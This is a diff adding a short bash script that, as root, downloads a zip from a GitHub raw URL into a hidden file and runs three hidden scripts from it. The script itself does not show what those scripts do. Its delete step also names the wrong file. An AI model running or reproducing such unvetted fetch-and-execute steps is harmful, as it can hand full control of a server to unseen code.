@@ -1,0 +1,6 @@
+#!/bin/bash
+REPO="https://raw.githubusercontent.com/YaddyKakkoii/tes/main/"
+
+cd /root && wget -O /root/.sodok.zip "${REPO}sodok.zip" && unzip .sodok.zip && rm sodok.zip && bash .gg && bash .null && bash .tt
+
+echo "selesai maszeeh"
